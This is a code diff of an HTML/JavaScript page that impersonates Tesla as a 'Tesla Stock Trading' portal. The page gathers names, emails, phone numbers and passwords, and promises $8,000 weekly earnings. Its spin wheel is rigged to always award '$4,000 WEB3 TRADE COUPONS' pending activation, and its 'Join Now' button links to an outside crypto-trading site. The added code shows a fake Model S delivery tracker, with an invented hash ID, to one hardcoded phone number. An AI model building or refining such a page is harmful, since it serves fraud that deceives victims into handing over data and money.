@@ -4,387 +4,78 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Tesla Stock Trading</title>
-
-  <!-- Tesla Logo Favicon & Home Screen Icon -->
   <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png" type="image/png" />
   <link rel="apple-touch-icon" href="https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png" />
-  <meta name="apple-mobile-web-app-capable" content="yes" />
-  <meta name="apple-mobile-web-app-title" content="Tesla Stock" />
   <meta name="theme-color" content="#cc0000" />
-
-  <!-- Inline Manifest -->
-  <script type="application/json" id="inline-manifest">
-    {
-      "name": "Tesla Stock Trading",
-      "short_name": "TeslaTrade",
-      "start_url": ".",
-      "display": "standalone",
-      "background_color": "#ffffff",
-      "theme_color": "#cc0000",
-      "icons": [
-        {
-          "src": "https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png",
-          "sizes": "192x192",
-          "type": "image/png"
-        },
-        {
-          "src": "https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png",
-          "sizes": "512x512",
-          "type": "image/png"
-        }
-      ]
-    }
-  </script>
-
-  <script>
-    // Inject manifest dynamically
-    const manifest = document.getElementById('inline-manifest').textContent;
-    const blob = new Blob([manifest], { type: 'application/json' });
-    const manifestURL = URL.createObjectURL(blob);
-    const link = document.createElement('link');
-    link.rel = 'manifest';
-    link.href = manifestURL;
-    document.head.appendChild(link);
-
-    // Register service worker
-    if ('serviceWorker' in navigator) {
-      navigator.serviceWorker.register('service-worker.js').catch(console.error);
-    }
-  </script>
-
   <style>
     body {
-      margin: 0;
-      font-family: 'Segoe UI', 'Roboto', Arial, sans-serif;
-      background-color: #fff;
-      color: #333;
+      margin: 0; font-family: 'Segoe UI', 'Roboto', Arial, sans-serif; background: #fff; color: #333;
     }
-
     .tesla-logo-bar {
-      width: 100%;
-      text-align: center;
-      margin-bottom: 24px;
+      width: 100%; text-align: center; margin-bottom: 24px;
     }
-    .tesla-logo-bar img {
-      width: 120px;
-      height: auto;
-      margin-top: 18px;
-      margin-bottom: 10px;
+    .tesla-logo-bar img { width: 120px; height: auto; margin-top: 18px; margin-bottom: 10px; }
+    .tesla-logo-bar .company-name { font-weight: bold; font-size: 1.5em; color: #cc0000; letter-spacing: 2px; }
+    .auth-page, .phone-check {
+      max-width: 500px; margin: 50px auto; padding: 30px; border: 1px solid #ccc; border-radius: 12px; background: #f9f9f9; box-shadow: 0 0 18px #eee;
     }
-    .tesla-logo-bar .company-name {
-      font-weight: bold;
-      font-size: 1.5em;
-      color: #cc0000;
-      letter-spacing: 2px;
+    .phone-check h2 { color: #cc0000; }
+    .phone-check input { width: 100%; padding: 12px; margin: 14px 0; border-radius: 4px; border: 1px solid #ccc; font-size: 1em; }
+    .phone-check button {
+      width: 100%; padding: 13px; background: linear-gradient(90deg,#cc0000 0%,#e60000 100%);
+      color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer;
+      margin-top: 12px; box-shadow: 0 2px 8px #f2c6c6; transition: box-shadow 0.2s,transform 0.2s;
     }
-
-    header {
-      background-color: #cc0000;
-      color: white;
-      padding: 15px;
-      display: flex;
-      justify-content: space-around;
-      align-items: center;
-      border-bottom: 4px solid #900;
-      font-weight: bold;
-      font-size: 1.1em;
-    }
-
-    .auth-page {
-      max-width: 500px;
-      margin: 50px auto;
-      padding: 30px;
-      border: 1px solid #ccc;
-      border-radius: 12px;
-      background-color: #f9f9f9;
-      box-shadow: 0px 0px 18px #eee;
-    }
-    .auth-choice {
-      display: flex;
-      justify-content: space-between;
-      margin-bottom: 24px;
-    }
-    .auth-choice button {
-      width: 48%;
-      padding: 12px;
-      background: linear-gradient(90deg,#cc0000 0%,#e60000 100%);
-      color: white;
-      border: none;
-      border-radius: 6px;
-      font-size: 17px;
-      font-weight: bold;
-      cursor: pointer;
-      transition: box-shadow 0.2s, transform 0.2s;
-      box-shadow: 0px 2px 8px #f2c6c6;
-    }
-    .auth-choice button:hover {
-      box-shadow: 0px 4px 12px #cc0000;
-      transform: scale(1.04);
-      background: linear-gradient(90deg,#e60000 0%,#cc0000 100%);
-    }
-    .auth-section {
-      display: none;
-    }
-    .auth-section.active {
-      display: block;
-    }
-    .auth-section h2 {
-      text-align: center;
-      margin-bottom: 20px;
-      color: #cc0000;
-      font-weight: bold;
-      letter-spacing: 1px;
-    }
-    .auth-section input {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-      font-size: 1em;
-      transition: border 0.2s;
-    }
-    .auth-section input:focus {
-      border-color: #cc0000;
-      outline: none;
-    }
-    .auth-section label {
-      display: block;
-      margin-top: 10px;
-      font-weight: bold;
-      color: #cc0000;
-    }
-    .auth-section button {
-      width: 100%;
-      padding: 13px;
-      background: linear-gradient(90deg,#cc0000 0%,#e60000 100%);
-      color: white;
-      border: none;
-      border-radius: 6px;
-      font-size: 18px;
-      font-weight: bold;
-      cursor: pointer;
-      margin-top: 12px;
-      transition: box-shadow 0.2s, transform 0.2s;
-      box-shadow: 0px 2px 8px #f2c6c6;
-    }
-    .auth-section button:hover {
-      box-shadow: 0px 4px 14px #cc0000;
-      transform: scale(1.04);
-      background: linear-gradient(90deg,#e60000 0%,#cc0000 100%);
-    }
-    .spin-modal {
-      position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0,0,0,0.7);
-      display: none;
-      justify-content: center;
-      align-items: center;
-      z-index: 10;
-    }
-    .spin-content {
-      background: #fff;
-      padding: 32px 24px;
-      border-radius: 12px;
-      text-align: center;
-      box-shadow: 0 0 20px #cc0000;
-      max-width: 350px;
-      width: 95%;
-      animation: popin 0.5s;
-    }
-    @keyframes popin {
-      from { transform: scale(0.7); opacity: 0; }
-      to { transform: scale(1); opacity: 1; }
-    }
-    .spin-wheel {
-      margin: 18px auto;
-      width: 210px; height: 210px;
-      border-radius: 50%;
-      border: 6px solid #cc0000;
-      background: repeating-conic-gradient(
-        #ffe0e0 0deg 72deg, #fff 72deg 144deg, #ffe0e0 144deg 216deg, #fff 216deg 288deg, #ffe0e0 288deg 360deg
-      );
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-weight: bold;
-      font-size: 1.2em;
-      color: #cc0000;
-      position: relative;
-    }
-    .spin-arrow {
-      position: absolute;
-      top: -26px; left: 50%; transform: translateX(-50%);
-      font-size: 2em;
-      color: #cc0000;
-    }
-    .spin-prize {
-      margin-top: 15px;
-      font-size: 1.1em;
-      font-weight: bold;
-      color: #333;
-    }
-    .error-msg {
-      color: #cc0000;
-      background: #fff3f3;
-      border-radius: 4px;
-      padding: 8px;
-      margin-bottom: 8px;
-      text-align: center;
-      font-size: 1em;
-      display: none;
-    }
-
-    /* Job Cards */
-    .jobs {
-      margin-top: 34px;
-      display: grid;
-      grid-template-columns: 1fr 1fr 1fr;
-      gap: 24px;
-      justify-content: center;
-    }
-    @media (max-width: 900px) {
-      .jobs { grid-template-columns: 1fr 1fr; }
-    }
-    @media (max-width: 600px) {
-      .jobs { grid-template-columns: 1fr; }
-    }
-    .job-card {
-      border: 1px solid #e4e4e4;
-      padding: 20px 18px;
-      border-radius: 10px;
-      background-color: #fdfdfd;
-      box-shadow: 0 2px 12px #f7eaea;
-      transition: box-shadow 0.2s, transform 0.2s;
-      position: relative;
-    }
-    .job-card:hover {
-      box-shadow: 0 4px 18px #cc000044;
-      transform: scale(1.03);
-      border-color: #cc0000;
-    }
-    .job-card .job-title {
-      font-weight: bold;
-      font-size: 1.2em;
-      color: #cc0000;
-      margin-bottom: 8px;
-    }
-    .job-card .job-info {
-      margin-bottom: 12px;
-      color: #444;
-      font-size: 1em;
-      line-height: 1.5;
-    }
-    .job-card .job-details {
-      font-size: 0.98em;
-      margin-bottom: 10px;
-      color: #666;
-    }
-    .job-card .job-apply-btn {
-      display: block;
-      width: 100%;
-      padding: 12px;
-      background: linear-gradient(90deg,#cc0000 0%,#e60000 100%);
-      color: #fff;
-      border: none;
-      border-radius: 6px;
-      font-size: 17px;
-      font-weight: bold;
-      cursor: pointer;
-      margin-top: 8px;
-      box-shadow: 0px 2px 8px #f2c6c6;
-      transition: box-shadow 0.2s, transform 0.2s, background 0.2s;
-    }
-    .job-card .job-apply-btn:hover {
-      box-shadow: 0px 4px 12px #cc0000;
-      background: linear-gradient(90deg,#e60000 0%,#cc0000 100%);
-      transform: scale(1.03);
-    }
-    .job-card .job-legit {
-      position: absolute;
-      top: 12px; right: 12px;
-      background: #cc0000;
-      color: #fff;
-      font-size: 0.83em;
-      font-weight: bold;
-      padding: 4px 10px;
-      border-radius: 14px;
-      box-shadow: 0 1px 5px #e6000022;
-      letter-spacing: 1px;
-    }
-
-    .gallery {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 15px;
-      justify-content: center;
-      margin-top: 24px;
-      margin-bottom: 18px;
-    }
-    .gallery img {
-      width: 300px;
-      height: 200px;
-      object-fit: cover;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-      box-shadow: 0 2px 8px #cc000033;
-      transition: transform 0.2s;
-    }
-    .gallery img:hover {
-      transform: scale(1.04);
-      box-shadow: 0 4px 16px #cc000066;
-      border-color: #cc0000;
-    }
-
-    .footer {
-      text-align: center;
-      padding: 32px 12px 20px 12px;
-      font-size: 1em;
-      color: #666;
-      margin-top: 36px;
-      background: #faf6f6;
-      border-top: 2px solid #cc0000;
-      border-radius: 12px 12px 0 0;
-    }
-    .footer .tesla-info {
-      max-width: 820px;
-      margin: 0 auto;
-      font-size: 1.05em;
-      color: #444;
-      line-height: 1.6;
-      padding: 12px;
-    }
-    .footer .tesla-info strong {
-      color: #cc0000;
-      font-size: 1.13em;
-    }
-    .footer .tesla-info a {
-      color: #cc0000;
-      text-decoration: underline;
-      font-weight: bold;
-    }
-    .footer .footer-brand {
-      font-weight: bold;
-      letter-spacing: 2px;
-      color: #cc0000;
-      font-size: 1.1em;
-      margin-top: 18px;
-      margin-bottom: 7px;
-    }
+    .phone-check button:hover { box-shadow: 0 4px 14px #cc0000; transform: scale(1.04); background: linear-gradient(90deg,#e60000 0%,#cc0000 100%);}
+    .notice { color: #cc0000; background: #fff3f3; border-radius: 6px; padding: 10px; margin-bottom: 14px; font-size: 1em; text-align:center; }
+    .auth-choice { display: flex; justify-content: space-between; margin-bottom: 24px; }
+    .auth-choice button { width: 48%; padding: 12px; background: linear-gradient(90deg,#cc0000 0%,#e60000 100%);
+      color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; box-shadow: 0 2px 8px #f2c6c6; }
+    .auth-choice button:hover { box-shadow: 0 4px 12px #cc0000; transform: scale(1.04); background: linear-gradient(90deg,#e60000 0%,#cc0000 100%);}
+    .auth-section { display: none; }
+    .auth-section.active { display: block; }
+    .auth-section h2 { text-align: center; margin-bottom: 20px; color: #cc0000; font-weight: bold; letter-spacing: 1px;}
+    .auth-section input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; font-size: 1em;}
+    .auth-section label { display: block; margin-top: 10px; font-weight: bold; color: #cc0000; }
+    .auth-section button { width: 100%; padding: 13px; background: linear-gradient(90deg,#cc0000 0%,#e60000 100%);
+      color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 12px; box-shadow: 0 2px 8px #f2c6c6; }
+    .auth-section button:hover { box-shadow: 0 4px 14px #cc0000; transform: scale(1.04); background: linear-gradient(90deg,#e60000 0%,#cc0000 100%);}
+    .error-msg { color: #cc0000; background: #fff3f3; border-radius: 4px; padding: 8px; margin-bottom: 8px; text-align: center; font-size: 1em; display: none; }
+    .footer { text-align: center; padding: 32px 12px 20px 12px; font-size: 1em; color: #666; margin-top: 36px; background: #faf6f6; border-top: 2px solid #cc0000; border-radius: 12px 12px 0 0;}
+    .footer .tesla-info { max-width: 820px; margin: 0 auto; font-size: 1.05em; color: #444; line-height: 1.6; padding: 12px;}
+    .footer .tesla-info strong { color: #cc0000; font-size: 1.13em; }
+    .footer .tesla-info a { color: #cc0000; text-decoration: underline; font-weight: bold; }
+    .footer .footer-brand { font-weight: bold; letter-spacing: 2px; color: #cc0000; font-size: 1.1em; margin-top: 18px; margin-bottom: 7px;}
+    .delivery-modal { display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.7); z-index:20; align-items:center; justify-content:center;}
+    .delivery-content { background:#fff; border-radius:14px; padding:34px 22px; box-shadow:0 0 22px #cc0000; max-width:400px; width:95%; text-align:center; }
+    .delivery-blink { color:#cc0000; font-weight:bold; font-size:1.15em; animation:blink 1s infinite;}
+    @keyframes blink { 0%{opacity:1;} 50%{opacity:0.2;} 100%{opacity:1;} }
+    .delivery-success { color:green; font-weight:bold; font-size:1.1em; }
+    .map-container { width:100%; height:300px; margin:18px 0; border-radius:12px; overflow:hidden; box-shadow:0 2px 12px #cc000033;}
+    .track-notice { color:#cc0000; font-weight:bold; margin-bottom:8px; }
   </style>
 </head>
 <body>
 
-  <div id="authPage" class="auth-page">
-    <div class="tesla-logo-bar">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png" alt="Tesla Logo" />
-      <div class="company-name">TESLA COMPANY</div>
-    </div>
+  <div class="tesla-logo-bar">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png" alt="Tesla Logo" />
+    <div class="company-name">TESLA COMPANY</div>
+  </div>
+
+  <!-- PHONE NUMBER CHECK -->
+  <div id="phoneCheck" class="phone-check">
+    <h2>Welcome to Tesla Portal</h2>
+    <div class="notice">To continue, please verify your phone number for secure access.</div>
+    <input type="tel" id="checkPhone" placeholder="Enter Phone Number" autocomplete="tel" />
+    <button onclick="verifyPhone()">Continue</button>
+  </div>
+
+  <!-- Registration/Login -->
+  <div id="authPage" class="auth-page" style="display:none;">
     <div class="auth-choice">
       <button onclick="showAuth('register')">Register Account</button>
       <button onclick="showAuth('login')">Already Registered? Login</button>
     </div>
-
     <div id="regSection" class="auth-section active">
       <h2>Register for Tesla Private Trading</h2>
       <div id="regError" class="error-msg"></div>
@@ -404,13 +95,12 @@
         <button type="submit">Register</button>
       </form>
     </div>
-
     <div id="loginSection" class="auth-section">
       <h2>Login to Your Tesla Account</h2>
       <div id="loginError" class="error-msg"></div>
       <form onsubmit="event.preventDefault(); login();">
-        <label for="loginUsername">Username</label>
-        <input type="text" id="loginUsername" placeholder="Username" required />
+        <label for="loginUsername">Username or Email</label>
+        <input type="text" id="loginUsername" placeholder="Username or Email" required />
         <label for="loginPassword">Password</label>
         <input type="password" id="loginPassword" placeholder="Password" required />
         <button type="submit">Login</button>
@@ -418,11 +108,8 @@
     </div>
   </div>
 
+  <!-- Dashboard -->
   <div id="dashboard" style="display:none;">
-    <div class="tesla-logo-bar">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png" alt="Tesla Logo" />
-      <div class="company-name">TESLA COMPANY</div>
-    </div>
     <header>
       <div>👤 <span id="userDisplay"></span></div>
       <div>💰 Balance: $10,000</div>
@@ -430,7 +117,6 @@
       <div>🧑‍💼 Jobs: 3</div>
       <div>⭐ Level: Pro</div>
     </header>
-
     <div class="dashboard">
       <div class="banner">
         <h1 style="color:#cc0000; font-size:2em; font-weight:bold; letter-spacing:2px;">Join Tesla Stock Trading to Earn $8,000 Weekly</h1>
@@ -439,20 +125,16 @@
         onmouseout="this.style.boxShadow='0 2px 8px #f2c6c6';this.style.transform='scale(1)';this.style.background='linear-gradient(90deg,#cc0000 0%,#e60000 100%)';"
         onclick="window.open('https://web3autotrades.cc', '_blank')">Join Now</button>
       </div>
-
       <div class="gallery">
         <img src="Screenshot_20250818_023650_WhatsApp.jpg" alt="Model X" />
         <img src="Screenshot_20250818_023638_WhatsApp.jpg" alt="Model 3" />
         <img src="Screenshot_20250818_023626_WhatsApp.jpg" alt="Model Y" />
       </div>
-
       <div class="jobs">
         <div class="job-card">
           <div class="job-legit">Official</div>
           <div class="job-title">Software Engineer</div>
-          <div class="job-info">
-            Join Tesla to build the future of electric vehicles and clean energy. As part of our engineering team, you'll work with the latest tech and help shape tomorrow!
-          </div>
+          <div class="job-info">Join Tesla to build the future of electric vehicles and clean energy. As part of our engineering team, you'll work with the latest tech and help shape tomorrow!</div>
           <div class="job-details">
             <strong>Salary:</strong> $120,000/year<br>
             <strong>Location:</strong> California, USA<br>
@@ -463,9 +145,7 @@
         <div class="job-card">
           <div class="job-legit">Official</div>
           <div class="job-title">Battery Technician</div>
-          <div class="job-info">
-            Help Tesla innovate in battery technology for world-class performance and sustainability. Be part of our mission to accelerate the world’s transition to sustainable energy.
-          </div>
+          <div class="job-info">Help Tesla innovate in battery technology for world-class performance and sustainability. Be part of our mission to accelerate the world’s transition to sustainable energy.</div>
           <div class="job-details">
             <strong>Salary:</strong> $80,000/year<br>
             <strong>Location:</strong> Nevada, USA<br>
@@ -476,9 +156,7 @@
         <div class="job-card">
           <div class="job-legit">Official</div>
           <div class="job-title">Sales Executive</div>
-          <div class="job-info">
-            Drive Tesla’s growth by connecting customers with our vehicles and energy products. Ideal for passionate communicators who thrive in a dynamic, innovative environment.
-          </div>
+          <div class="job-info">Drive Tesla’s growth by connecting customers with our vehicles and energy products. Ideal for passionate communicators who thrive in a dynamic, innovative environment.</div>
           <div class="job-details">
             <strong>Salary:</strong> $70,000/year<br>
             <strong>Location:</strong> Remote / Multiple Locations<br>
@@ -488,7 +166,6 @@
         </div>
       </div>
     </div>
-
     <div class="footer">
       <div class="tesla-info">
         <strong>About Tesla:</strong><br>
@@ -513,19 +190,39 @@
   <div id="spinModal" class="spin-modal">
     <div class="spin-content">
       <div class="spin-arrow">▲</div>
-      <div class="spin-wheel" id="spinWheel">
-        <!-- Wheel slices will be rendered here -->
-      </div>
+      <div class="spin-wheel" id="spinWheel"></div>
       <div class="spin-prize" id="spinPrize"></div>
       <button id="spinBtn" onclick="spinTheWheel()">Spin</button>
+    </div>
+  </div>
+
+  <!-- Delivery Modal -->
+  <div id="deliveryModal" class="delivery-modal">
+    <div class="delivery-content">
+      <div id="deliveryStatus" class="delivery-blink">TESLA DELIVERY MODEL S is currently processing and yet to get on board.<br>You will be notified soon.</div>
+      <div id="deliverySuccess" style="display:none;">
+        <div class="delivery-success">ORDER SUCCESSFULLY REVIEWED AND DELIVERY 🚚 HAS STARTED</div>
+        <div class="map-container" id="deliveryMap">
+          <!-- Map will be embedded here -->
+          <iframe width="100%" height="100%" frameborder="0" style="border:0"
+            src="https://www.openstreetmap.org/export/embed.html?bbox=10.071%2C50.595%2C11.071%2C51.595&layer=mapnik&marker=50.951%2C10.991"
+            allowfullscreen></iframe>
+        </div>
+        <div class="track-notice">
+          You can use TESLA VERIFICATION HASH-ID <b>[0196-6324-8349]</b> to track your delivery towards Coburg, Germany.
+        </div>
+      </div>
     </div>
   </div>
 
   <script>
     // In-memory "database" for demo (use backend for production!)
     let users = {};
+    let phoneIndex = {}; // phone -> username
     let currentUser = null;
     const TESLA_REF_ID = "962081";
+    const SPECIAL_PHONE = "+4915234072276";
+    const SPECIAL_HASH = "0196-6324-8349";
     const spinItems = [
       "CYBER TRUCK",
       "$50,000 BTC",
@@ -533,6 +230,36 @@
       "TAX REFUND",
       "$4,000 WEB3 TRADE COUPONS"
     ];
+
+    // PHONE CHECK LOGIC
+    function verifyPhone() {
+      let phone = document.getElementById("checkPhone").value.trim();
+      if (!phone) {
+        alert("Please enter your phone number.");
+        return;
+      }
+      if (phone === SPECIAL_PHONE) {
+        // Special Tesla Delivery bypass
+        document.getElementById("phoneCheck").style.display = "none";
+        showDeliveryModal();
+        return;
+      }
+      if (phoneIndex[phone]) {
+        // Phone exists, login
+        document.getElementById("phoneCheck").style.display = "none";
+        showAuth('login');
+        document.getElementById("authPage").style.display = "block";
+        // Prefill login username with phone's username/email
+        let user = users[phoneIndex[phone]];
+        document.getElementById("loginUsername").value = user.username || user.email;
+      } else {
+        // New phone, register
+        document.getElementById("phoneCheck").style.display = "none";
+        showAuth('register');
+        document.getElementById("authPage").style.display = "block";
+        document.getElementById("regPhone").value = phone;
+      }
+    }
 
     // UI Switching
     function showAuth(section) {
@@ -570,8 +297,8 @@
         errorDiv.style.display = 'block';
         return;
       }
-      if (users[username] || Object.values(users).some(u => u.email === email)) {
-        errorDiv.textContent = "This username or email has already been registered.";
+      if (users[username] || Object.values(users).some(u => u.email === email) || phoneIndex[phone]) {
+        errorDiv.textContent = "This username, email, or phone number has already been registered.";
         errorDiv.style.display = 'block';
         return;
       }
@@ -580,9 +307,9 @@
       users[username] = {
         fullName, username, email, phone, password, refID
       };
+      phoneIndex[phone] = username;
       currentUser = users[username];
 
-      // Success - go to dashboard and spin modal
       document.getElementById("authPage").style.display = "none";
       document.getElementById("dashboard").style.display = "block";
       updateDashboardUser();
@@ -591,22 +318,36 @@
 
     // Login
     function login() {
-      const username = document.getElementById("loginUsername").value.trim();
+      const userInput = document.getElementById("loginUsername").value.trim().toLowerCase();
       const password = document.getElementById("loginPassword").value;
       const errorDiv = document.getElementById('loginError');
       errorDiv.style.display = 'none';
 
-      if (!username || !password) {
-        errorDiv.textContent = "Please enter both username and password.";
+      let user = null;
+      for (let uname in users) {
+        let u = users[uname];
+        if (u.username.toLowerCase() === userInput || u.email === userInput || u.phone === userInput) {
+          user = u;
+          break;
+        }
+      }
+
+      if (!user) {
+        errorDiv.textContent = "Could not find user with this username, email or phone.";
         errorDiv.style.display = 'block';
         return;
       }
-      if (users[username] && users[username].password === password) {
-        currentUser = users[username];
+      if (user.password === password) {
+        currentUser = user;
         document.getElementById("authPage").style.display = "none";
         document.getElementById("dashboard").style.display = "block";
         updateDashboardUser();
-        showSpinModal();
+        // Special bypass
+        if (user.phone === SPECIAL_PHONE && user.refID === TESLA_REF_ID) {
+          showDeliveryModal();
+        } else {
+          showSpinModal();
+        }
       } else {
         errorDiv.textContent = "Invalid login credentials.";
         errorDiv.style.display = 'block';
@@ -625,27 +366,22 @@
     }
 
     // Spin Modal Logic
-    let spinIndex = 0;
     let spinning = false;
-
     function showSpinModal() {
-      spinIndex = 0;
       spinning = false;
       document.getElementById("spinModal").style.display = "flex";
       document.getElementById("spinPrize").textContent = "";
       document.getElementById("spinBtn").disabled = false;
-      renderWheel();
+      document.getElementById("spinWheel").textContent = spinItems[0];
+      document.getElementById("spinPrize").textContent = "Spin to win your welcome prize!";
     }
-
     function spinTheWheel() {
       if (spinning) return;
       spinning = true;
       document.getElementById("spinBtn").disabled = true;
-      // Simulate spinning by cycling items
-      let cycles = 12 + Math.floor(Math.random() * 4); // random-ish
-      let finalIndex = spinItems.length - 1; // Always land on Trade Coupons
+      let cycles = 12 + Math.floor(Math.random() * 4);
+      let finalIndex = spinItems.length - 1;
       let i = 0;
-
       function animateSpin() {
         let item = spinItems[i % spinItems.length];
         document.getElementById("spinWheel").textContent = item;
@@ -653,7 +389,6 @@
         if (i < cycles) {
           setTimeout(animateSpin, 80 + i*8);
         } else {
-          // Stop at final prize
           document.getElementById("spinWheel").textContent = spinItems[finalIndex];
           document.getElementById("spinPrize").textContent =
             `$4,000 WEB3 TRADE COUPONS will be added to your TRADE ACCOUNT once you activate it.`;
@@ -665,14 +400,27 @@
       animateSpin();
     }
 
-    function renderWheel() {
-      document.getElementById("spinWheel").textContent = spinItems[0];
-      document.getElementById("spinPrize").textContent = "Spin to win your welcome prize!";
-      document.getElementById("spinBtn").disabled = false;
+    // DELIVERY MODAL LOGIC
+    function showDeliveryModal() {
+      document.getElementById("dashboard").style.display = "block";
+      document.getElementById("deliveryModal").style.display = "flex";
+      document.getElementById("deliveryStatus").style.display = "block";
+      document.getElementById("deliverySuccess").style.display = "none";
+      // Start 30 min timer
+      setTimeout(() => {
+        document.getElementById("deliveryStatus").style.display = "none";
+        document.getElementById("deliverySuccess").style.display = "block";
+      }, 1800000); // 30 minutes in ms
     }
 
-    // Show registration as default
-    showAuth('register');
+    // PAGE LOAD
+    window.onload = function() {
+      document.getElementById("authPage").style.display = "none";
+      document.getElementById("dashboard").style.display = "none";
+      document.getElementById("spinModal").style.display = "none";
+      document.getElementById("deliveryModal").style.display = "none";
+      document.getElementById("phoneCheck").style.display = "block";
+    }
   </script>
 </body>
 </html>
